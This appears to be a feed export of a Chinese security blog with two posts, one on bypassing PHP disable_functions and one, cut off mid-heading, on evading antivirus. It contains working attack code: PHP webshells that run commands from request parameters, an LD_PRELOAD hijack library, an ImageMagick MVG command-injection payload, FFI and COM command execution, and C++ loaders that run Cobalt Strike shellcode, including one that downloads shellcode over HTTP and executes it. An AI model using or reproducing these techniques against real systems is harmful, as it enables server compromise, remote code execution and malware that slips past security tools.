    <content type="html"><![CDATA[<h2 id="RCE函数黑名单绕过"><a href="#RCE函数黑名单绕过" class="headerlink" title="RCE函数黑名单绕过:"></a>RCE函数黑名单绕过:</h2><p>1.exec/shell_exec (执行系统命令,无回显)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo (exec&#x2F;shell_exec(&#39;whoami&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.system/passthru (执行系统命令,有回显)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   passthru&#x2F;system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>3.popen （<strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> ) ）<br>作用:创建一个管道,fork一个子进程来执行传入的command命令。并在正常的情况下返回I/O流,管道由pclose手动关闭.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$command&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">$handle &#x3D; popen($command , &quot;r&quot;);</span><br><span class="line">   while(!feof($handle))</span><br><span class="line">   &#123;        echo fread($handle, 1024);  &#x2F;&#x2F;fread($handle, 1024);</span><br><span class="line">   &#125;  </span><br><span class="line">   pclose($handle);?&gt;</span><br></pre></td></tr></table></figure><p>4.proc_open ( <strong>proc_open</strong> ( string <code>$cmd</code> , array <code>$descriptorspec</code> , array <code>&amp;$pipes</code> )<br>可以看作是popen的强化版.<br>作用:创建一个管道,fork一个子进程来执行传入的command命令,$descriptorspec控制子进程文件描述符符，$pipes是数组，其元素是返回的I/O流(索引0，1，2代表对于文件描述符的I/O流)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$descriptorspec写法</span><br><span class="line"> $descs &#x3D; array( </span><br><span class="line">                0 &#x3D;&gt; array( &#39;pipe&#39; , &#39;r&#39; ) ,  #输入</span><br><span class="line">                1 &#x3D;&gt; array( &#39;file&#39; , &#39;output&#39; , &#39;w&#39; ) , #输出，可以为管道(pipe)或文件</span><br><span class="line">                2 &#x3D;&gt; array( &#39;file&#39; , &#39;errors&#39; , &#39;w&#39; )   #错误日志，可以为管道(pipe)或文件</span><br><span class="line">            );</span><br><span class="line">&lt;?php</span><br><span class="line">   $command&#x3D;&quot;ipconfig&quot;;</span><br><span class="line">   $descriptorspec &#x3D; array(1 &#x3D;&gt; array(&quot;pipe&quot;, &quot;w&quot;));  &#x2F;&#x2F;标准输出定位到管道</span><br><span class="line">   $handle &#x3D; proc_open($command ,$descriptorspec , $pipes);</span><br><span class="line">   while(!feof($pipes[1]))   &#x2F;&#x2F;管道索引1代表子进程的标准输出（通过$descriptorspec定义)</span><br><span class="line">   &#123;        echo fread($pipes[1], 1024); &#x2F;&#x2F;fgets($pipes[1],1024);</span><br><span class="line">   &#125;?&gt;</span><br></pre></td></tr></table></figure><h2 id="LD-PRELOAD与putenv-绕过"><a href="#LD-PRELOAD与putenv-绕过" class="headerlink" title="LD_PRELOAD与putenv 绕过"></a>LD_PRELOAD与putenv 绕过</h2><p>LD_PRELOAD这个环境变量定义的动态链接库会比其他动态链接库先被调用.<br>putenv(“环境变量名”=”value”) php代码里用于设置环境变量的函数<br>动态链接库(.so文件): 命令在运行时会进行系统调用,从共享链接库里调用代码.动态链接库是共享链接库的一种，其里面一般都是.so文件<br>关于系统调用,链接库等等知识放在另一个文章 <a href="http://www.const27.com/">www.const27.com</a></p><h3 id="利用php代码里的mail函数达到绕过目的"><a href="#利用php代码里的mail函数达到绕过目的" class="headerlink" title="利用php代码里的mail函数达到绕过目的"></a>利用php代码里的mail函数达到绕过目的</h3><p>通过strace查看php里的mail函数,发现其调用了 linux里的sendmail指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 23864] execve(&quot;&#x2F;bin&#x2F;sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail -t -i &quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 23865] execve(&quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail&quot;, [&quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure><p>发现其调用了sendmail，那么sendmail调用了什么?可以很清楚的看到它调用了很多命令,那么我们思路如下：<br>创建一个动态链接库，定义一个同名命令（植入payload)，并在之后把它放在LD_PRELOAD里优先调用,这样只需执行调用了mail函数的php文件，再又mail函数调用sendmail命令，再由sendmail命令优先调用我们重写的命令，即可绕过disable_functions.</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154527.png" alt="QQ截图20210219154527"></p><p>我们这里重写getuid命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);   &#x2F;&#x2F;payload</span><br><span class="line">&#125;</span><br><span class="line">int geteuid() </span><br><span class="line">&#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将他编译为动态链接库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>接下来运行PHP脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行一下，可以发现payload确实被执行了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154617.png" alt="QQ截图20210219154617"></p><h3 id="mail函数更广的攻击面-attribute-constructor"><a href="#mail函数更广的攻击面-attribute-constructor" class="headerlink" title="mail函数更广的攻击面: attribute ((constructor))"></a>mail函数更广的攻击面: <strong>attribute</strong> ((<strong>constructor</strong>))</h3><p>如果我们的linux里没有sendmail指令了呢？这个时候就要用到 <strong>attribute</strong> ((<strong>constructor</strong>)) 了</p><p><strong>attribute</strong> ((<strong>constructor</strong>)) ：加载共享库时就自动运行,通常再程序启动时运行（有点类似魔术函数？哈哈)<br>c语言代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LD_PRELOAD指定一下该so，执行PHP程序，可见payload确实被实现了</p><h2 id="脏东西-使用蚁剑-disable-functions绕过插件"><a href="#脏东西-使用蚁剑-disable-functions绕过插件" class="headerlink" title="脏东西:使用蚁剑 disable_functions绕过插件"></a>脏东西:使用蚁剑 disable_functions绕过插件</h2><p>蛮无脑的,把这个插件开了就完事了</p><h2 id="ImageMagick漏洞（CVE-2016-3714）"><a href="#ImageMagick漏洞（CVE-2016-3714）" class="headerlink" title="ImageMagick漏洞（CVE-2016-3714）"></a>ImageMagick漏洞（CVE-2016-3714）</h2><p> 参考 <a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h3 id="何为ImageMagick"><a href="#何为ImageMagick" class="headerlink" title="何为ImageMagick"></a>何为ImageMagick</h3><p>简而言之，就是一个处理图片的程序。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>ImageMagick有一个功能叫做 delegate(委托),作用是调用外部的lib处理文件。<br>在ImageMagick的配置文件 /etc/ImageMagick/delegates.xml 可以看到所有的委托(自己去看)</p><p>它的委托一般是长这样的,意思是在处理https图片时，会调用command的里的指令.command里的%m代表一种占位符，%m占位符代表获取https图片的url（当然占位符不仅仅%m一种，还有 比如%i是输入的文件名，%l是图片exif label信息 等等等等)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;delegate decode&#x3D;&quot;https&quot; command&#x3D;&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 所以我们可以构造一个mvg文件(文件名后缀不一定非得.mvg，imagemagick是按照文件内容来区分文件类型的)交给imagemagick处理，在其包含https处使用|或&amp;分割命令，造成rce,如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|mkdir &#x2F;nmsl; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>上面是mvg的一种格式，其中在fill处填入https的url.</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152837.png" alt="QQ截图20210217152837"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152846.png" alt="QQ截图20210217152846"></p><h2 id="ffi-rce"><a href="#ffi-rce" class="headerlink" title="ffi rce"></a>ffi rce</h2><p>适用版本:php&gt;7.4<br>需要： FFI support = enable ，（开启ffi)<br><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。 (极大拓宽ffi rce攻击面)</p><p>ffi是php&gt;7.4新增的一个东西，简而言之就是一个可以在php里调用c语言代码的接口.</p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a> 官方文档</p><p>我们的payload雏形一般是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ffi&#x3D;FFI::cdef&#123;</span><br><span class="line">   &quot;int system(char *format);&quot;</span><br><span class="line">&#125;;</span><br><span class="line">$ffi-&gt;system(command);</span><br></pre></td></tr></table></figure><p>找个机会让服务器调用FFI就可以了，这样就可以绕过disable_functions了</p><h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>需求: windows系统，且system32目录下存在wshom.ocx<br>php.ini里com.allow_dcom=true<br>php.ini里extension=php_com_dotnet.dll(没有的话自己加上)</p><p>正确配置后，在phpinfo中看,这样就算配置好了环境</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155029.png" alt="QQ截图20210219155029"></p><p>ban掉函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155038.png" alt="QQ截图20210219155038"></p><p>.这种情况我们来绕绕disable_functions</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>找个机会把这个脚本传到服务器上,然后访问它，cmd传命令就可以了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155052.png" alt="QQ截图20210219155052"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;RCE函数黑名单绕过&quot;&gt;&lt;a href=&quot;#RCE函数黑名单绕过&quot; class=&quot;headerlink&quot; title=&quot;RCE函数黑名单绕过:&quot;&gt;&lt;/a&gt;RCE函数黑名单绕过:&lt;/h2&gt;&lt;p&gt;1.exec/shell_exec (执行系统命令,无回显)&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://yoursite.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>DefenseEvasion收集</title>
    <link href="http://yoursite.com/2021/02/19/Defense%20Evasion%20%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2021/02/19/Defense%20Evasion%20%E6%94%B6%E9%9B%86/</id>
    <published>2021-02-19T09:21:55.788Z</published>
    <updated>2021-02-19T08:51:07.532Z</updated>
    
    <content type="html"><![CDATA[<p>前面的话:”免杀一般都是靠组合拳”</p><h2 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h2><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>没什么好说的。可以自写加壳器等等</p><h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。</p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="指针执行-申请内存动态加载shellcode"><a href="#指针执行-申请内存动态加载shellcode" class="headerlink" title="指针执行+申请内存动态加载shellcode"></a>指针执行+申请内存动态加载shellcode</h3><p>首先从cobalt strike上生成拿到shellcode用作本次测试。<br>然后通过下面的代码，直接执行写死在程序里的shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145713.png" alt="QQ截图20210217145713"></p><p>可以看见，还是很拉跨的。</p><h3 id="内联汇编加载shellcode"><a href="#内联汇编加载shellcode" class="headerlink" title="内联汇编加载shellcode"></a>内联汇编加载shellcode</h3><p>c++有强大的内联汇编功能，上次写壳的时候就感受了一番。<br>我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">_asm &#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">jmp eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145723.png" alt="QQ截图20210217145723"></p><p>还是蛮拉跨的，虽然我没有加花。</p><h3 id="HTTP协议远程读取shellcode"><a href="#HTTP协议远程读取shellcode" class="headerlink" title="HTTP协议远程读取shellcode"></a>HTTP协议远程读取shellcode</h3><p>这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。<br>这里涉及到winhttp.h的一些函数的使用。</p><p>源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145737.png" alt="QQ截图20210217145737"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize &#x3D; 0;</span><br><span class="line">    DWORD dwDownloaded &#x3D; 0;</span><br><span class="line">    LPSTR pszOutBuffer &#x3D; NULL;</span><br><span class="line">    HINTERNET  hSession &#x3D; NULL,</span><br><span class="line">        hConnect &#x3D; NULL,</span><br><span class="line">        hRequest &#x3D; NULL;</span><br><span class="line">    BOOL  bResults &#x3D; FALSE;</span><br><span class="line">    hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">    if (hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;;</span><br><span class="line">    SIZE_T len &#x3D; lstrlenW(header);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">    if (hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;;</span><br><span class="line">        const void *ss &#x3D; (const char *)data.c_str();</span><br><span class="line">        bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);</span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Check for available data.</span><br><span class="line">            dwSize &#x3D; 0;</span><br><span class="line">            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!dwSize)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer &#x3D; new char[dwSize + 1];</span><br><span class="line"></span><br><span class="line">            if (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Out of memory\n&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ZeroMemory(pszOutBuffer, dwSize + 1);</span><br><span class="line"></span><br><span class="line">            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ok&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;char ShellCode[1024];</span><br><span class="line">            int code_length &#x3D; strlen(pszOutBuffer);</span><br><span class="line">            char* ShellCode &#x3D; (char*)calloc(code_length  &#x2F;2 , sizeof(unsigned char));</span><br><span class="line"></span><br><span class="line">            for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123;</span><br><span class="line">                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);</span><br><span class="line">                pszOutBuffer +&#x3D; 2;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%s&quot;, ShellCode);</span><br><span class="line">            &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer);</span><br><span class="line">            void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            memcpy(exec, ShellCode, sizeof ShellCode);</span><br><span class="line">            ((void(*)())exec)();</span><br><span class="line">            delete[] pszOutBuffer;</span><br><span class="line">            if (!dwDownloaded)</span><br><span class="line">                break;</span><br><span class="line">        &#125; while (dwSize &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">    if (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    if (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    if (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程便是:</p><p>1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode））</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145818.png" alt="QQ截图20210217145818"></p><p>2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中<br>3.执行shellcode，可以用指针执行等方法执行。</p><h3 id="使用加载器加载shellcode"><a href="#使用加载器加载shellcode" class="headerlink" title="使用加载器加载shellcode"></a>使用加载器加载shellcode</h3><h4 id="shellcode-launcher-加载器"><a href="#shellcode-launcher-加载器" class="headerlink" title="shellcode_ launcher 加载器"></a>shellcode_ launcher 加载器</h4><p><a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p>用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.<br>像这样 shellcode_launcher.exe -i C:\payload32.bin<br>shellcode_ launcher 在virustotal上报毒率也是很高很高了…</p><h4 id="SSI-加载器"><a href="#SSI-加载器" class="headerlink" title="SSI 加载器"></a>SSI 加载器</h4><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p> cs生成c形式shellcode，然后去除\x，再拿给ssi加载器加载,像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145832.png" alt="QQ截图20210217145832"></p><p>ssi.exe shellcode 即可完成加载</p><p>ssi在virustotal上报毒率也是非常高..</p><h4 id="自写加载器"><a href="#自写加载器" 